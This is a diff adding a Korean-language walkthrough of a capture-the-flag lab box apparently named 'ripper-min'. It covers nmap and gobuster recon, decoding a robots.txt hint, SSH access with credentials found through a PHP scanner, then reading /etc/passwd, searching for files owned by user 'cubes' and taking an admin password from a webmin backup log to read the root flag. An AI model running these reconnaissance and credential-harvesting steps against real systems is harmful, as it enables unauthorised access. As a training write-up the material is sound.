@@ -1,0 +1,46 @@
+nmap -sn 172.16.11.0/24
+nmap -p- -sV 172.16.11.227
+dirb http://172.16.11.227/
+sudo vi /etc/hosts
+	>ripper-min 도메인 등록하고
+		>ripper-mim:10000으로 접속
+sudo gobuster dir -u http://ripper-min -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,log,bak -t 80 --no-error
+
+https://ripper-min:10000/robots.txt
+echo d2Ugc2NhbiBwaHAgY29kZXMgd2l0aCByaXBzCg== | base64 -d
+	> we scan php codes with rips 
+		> rips가 답 80번 포트로 진입
+		>http://ripper-min/rips
+들어가서
+/var/www/html/rips 넣어주기
+	>secret.php찾고 아이디 비번 넣어서 ssh 진입
+flag.txt얻기
+cat /etc/passwd | grep bash
+	> 사용자 계정에 접근 권한이 있으나 취약점 찾아 보기 위해서 다른 사용자 확인해보기
+find / -user cubes -type f -exec ls -al {} \; 2>/dev/null
+	> su로 cubes계정 전환
+다시 한번, 사용자 리퍼에 대해 했던 것과 동일한 단계를 수행했습니다. 마찬가지로 아무것도 얻지 못했습니다. 그래서 사용자 큐브가 접근할 수 있는 파일을 확인해 보았습니다.
+find / -user cubes -type f -exec ls -al {} \; 2>/dev/null
+	> cat /var/webmin/backup/miniser.log
+		>admin/tokiohotel
+cd /root
+ls -al
+cat flag.txt
+
+
+🔑 1. cat /etc/passwd | grep bash
+❓ 왜 이 명령어를 썼을까? (목적)
+처음에 ripper 계정으로 SSH 진입을 성공했잖아요? 하지만 ripper 계정은 일반 사용자일 뿐이라, 우리가 최종 목표로 하는 /root/flag.txt를 읽을 권한이 없습니다.
+
+그렇다면 "이 서버에 ripper 말고 또 어떤 사용자들이 살고 있지? 내가 뺏을 만한 다른 타겟 계정이 있나?" 하고 서버의 주민등록등본을 조회해 본 것입니다. 그중에서도 실제로 터미널 명령어를 입력할 수 있는 '진짜 사용자'만 쏙 골라내기 위해 이 명령어를 쓴 거예요.
+
+🔍 2. find / -user cubes -type f -exec ls -al {} \; 2>/dev/null
+❓ 왜 이 명령어를 썼을까? (목적)
+자, 이제 다음 타겟이 cubes라는 걸 알았습니다. 그럼 이 cubes라는 사용자의 비밀번호를 알아내거나 이 계정으로 넘어가야 하잖아요?
+
+그래서 "이 서버 전체를 통틀어서, cubes라는 사용자가 주인(소유자)인 파일이 어디 어디에 숨어있지? 혹시 그 파일들 중에 비밀번호 같은 힌트가 적힌 찌꺼기 파일이 있나?" 하고 이 잡듯 뒤진 것입니다.
+
+결국 이 촘촘한 그물망 명령어 덕분에 일반적인 경로나 홈 디렉토리가 아닌, 깊숙한 곳에 숨겨져 있던 /var/webmin/backup/miniser.log라는 백업 로그 파일을 찾아냈고, 그 안에서 admin/tokiohotel이라는 대박 힌트를 건지신 거예요!
+
+
+
